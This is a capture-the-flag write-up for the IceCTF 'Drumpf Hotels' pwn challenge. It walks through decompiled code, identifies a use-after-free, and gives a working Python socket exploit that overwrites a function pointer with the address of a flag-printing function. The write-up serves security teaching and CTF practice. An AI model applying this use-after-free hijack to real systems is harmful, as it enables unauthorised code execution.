# Drumpf Hotels (Pwn, 75)

In the task description we are given the following info:
>Drumpf Hotels - Making security great again!  
>Donald Drumpf decided to move his hotel operations online. Since he isn't very fond of foreigners coding for him, he dediced to code the platform with his own tiny hands.

A little bit info about task file:
```
File name : drumpf  
File type : ELF 32-bit LSB executable  
SHA1      : e06887d95dce0a05f0c9c932b1c0eba70f2516cd
```

And some `checksec` details:
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Tools used:  
>IDA Pro  

Let's go straight to the `main()` and see what's there for us:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char choice[4];
  int security_cookie;

  ...
  print_logo();
  while ( 1 )
  {
    print_menu();
    fgets(choice, 4, stdin);
    switch ( atoi(choice) )
    {
      case 1:
        book_suite(); // interesting
        break;
      case 2:
        book_room(); // interesting
        break;
      case 3:
        delete_booking(); // interesting
        break;
      case 4:
        print_booking(); // interesting
        break;
      case 5:
        puts("Make overflows great again!");
        fflush(stdout);
        return 0;
      default:
        puts("Invalid choice!");
        fflush(stdout);
        break;
    }
  }
}
```

Ok, everything here seems to be self-explanatory.  
We can either `book_suite()`, `book_room()`, `delete_booking()` or `print_booking()`.  
There is also `flag()` function that doesn't have any reference in the binary.

```c
int flag()
{
  ...
  char buf[256];
  ...
  fd = open("./flag.txt", 0);
  read(fd, buf, 0x100u);
  printf("%s", buf);
  fflush(stdout);
  ...
}
```
Oh, it just reads the flag and prints it to the _stdout_.  
If it's here, there's definitely some purpose for that.

But, let's go back to those marked functions and see what they do.
```c
struct suite_struct {
	void * fnPrintName;
	uint8_t name[256];
	uint32_t number;
};

int book_suite()
{
  suite_struct *suite_info;
  char suite_no[16];

  ...
  suite = malloc(sizeof(suite_struct));
  printf("Name: ");
  fflush(stdout);
  fgets(suite->name, 256, stdin);
  suite->fnPrintName = print_name; // important!
  printf("Suite number: ");
  fflush(stdout);
  fgets(suite_no, 16, stdin);
  suite_info = suite;
  suite_info->number = atoi(suite_no);
  puts("Booked a suite!");
  fflush(stdout);
  ...
}
```

Just for convenience, I added a custom structure to IDA so I could clearly see what's going on here.

Summary:
> `suite_struct` is allocated on heap using `malloc()` and filled in  
> Suite name `fgets(suite->name, 256, stdin);`  
> Function that will print out the name `suite->fnPrintName = print_name;`  
> Suite number `suite_info->number = atoi(suite_no);`  

Let's take a look at `print_name()` function.

```c
int __cdecl print_name(int a1)
{
  ...
  printf("Name: %s", a1);
  fflush(stdout);
  ...
}
```

Ok, so it just prints out as a string whatever is passed in the first argument.

Let's go further.
```c
struct room_struct {
	uint32_t number;
	uint8_t name[256];
};

int book_room()
{
  room_struct *room_info;
  char room_no[16];

  ...
  room = malloc(sizeof(room_struct));
  printf("Name: ");
  fflush(stdout);
  fgets(room->name, 256, stdin);
  printf("Room number: ");
  fflush(stdout);
  fgets(room_no, 16, stdin);
  room_info = room;
  room_info->number = atoi(room_no);
  puts("Booked a room!");
  fflush(stdout);
  ...
}
```

Again, for convenience, I added another structure.

Summary:
> `room_struct` is allocated on heap using `malloc()` and filled in  
> Room name `fgets(room->name, 256, stdin);`  
> Room number `room_info->number = atoi(room_no);`  

Moving on...
```c
int delete_booking()
{
  ...
  if ( suite || room )
  {
    if ( suite )
    {
      free(suite);
      puts("Suite booking deleted!");
      fflush(stdout);
    }
    if ( room )
    {
      free(room);
      puts("Room booking deleted!");
      fflush(stdout);
    }
  }
  else
  {
    printf("No booking found!");
    fflush(stdout);
  }
  ...
}
```

Here we can see that `suite` and/or `room` structure are/is freed.  
What's worth noting is fact that after freeing, there's no `NULL` assignment to a freed buffer.  
We will use that fact later.

And the last function to look at:
```c
int print_booking()
{
  ...
  if ( suite || room )
  {
    if ( suite )
    {
      (suite->fnPrintName)(suite->name);
      printf("Rooms number: %u\n", suite->number);
      fflush(stdout);
    }
    if ( room )
    {
      printf("Name: %s", room->name);
      printf("Rooms number: %u\n", room->number);
      fflush(stdout);
    }
  }
  else
  {
    printf("No booking found!");
    fflush(stdout);
  }
  ...
}
```

As it says, it prints `suite` and/or `room`.  
Although in case of `suite` it uses a structure member `fnPrintName` called with one argument.

What we can see here is typical example of `Use After Free vulnerability`.  

Here's short example in python:
```python
>>> import ctypes
>>> libc = ctypes.cdll.LoadLibrary('libc.so.6')
>>> libc.malloc(264)
157601144
>>> libc.malloc(264)
157462264
>>> libc.malloc(264)
157598936
>>> libc.malloc(264)
157599208
>>> libc.free(_)
1
>>> libc.malloc(260)
157599208
>>>
```

And a brief explanation:
>Buffer at address `157599208` of size `264` is created.  
>Buffer at address `157599208` is freed.  
>Buffer at address `157599208` of size `260` is allocated again.

But, how can we use that? Remember the structure layout for `suite_struct` and `room_struct`?  
If not let's bring them back.

```c
struct suite_struct {
	void * fnPrintName;
	uint8_t name[256];
	uint32_t number;
};

struct room_struct {
	uint32_t number;
	uint8_t name[256];
};
```

What is a room number in case of `room_struct`, can be used as `fnPrintName` in case of `suite_struct`.  
This way we could get execution of arbitrary function.

How does that help us?  
Remember `flag()` function that didn't have any reference?  
What if we pass its address `0x0804863D` as a room number (in decimal, because of `atoi()`), and then reuse that object as a suite (using `print_booking()`)?
We would have execution of `0x0804863D`.

Perfect, let's do it!

```python
import struct
import socket

s = socket.create_connection( ( 'drumpf.vuln.icec.tf', 6502 ) )
print s.recv(4096)
print s.recv(4096)

for i in xrange( 4 ):
	s.send('1\n') # add suite
	print s.recv(4096)
	s.send('foo\n') # suite name
	print s.recv(4096)
	s.send('1\n') # suite number
	print s.recv(4096)
	print s.recv(4096)

s.send('3\n') # delete booking
print s.recv(4096)

s.send('2\n') # add room
print s.recv(4096)

s.send('foo\n') # room name
print s.recv(4096)
s.send('134514237\n') # room number 0x804863D
print s.recv(4096)
print s.recv(4096)

print s.send('4\n') # print booking
print repr( s.recv(4096) )
print repr( s.recv(4096) )
```

And that's it, we get the flag `IceCTF{they_can_take_our_overflows_but_they_will_never_take_our_use_after_freeeedom!}`
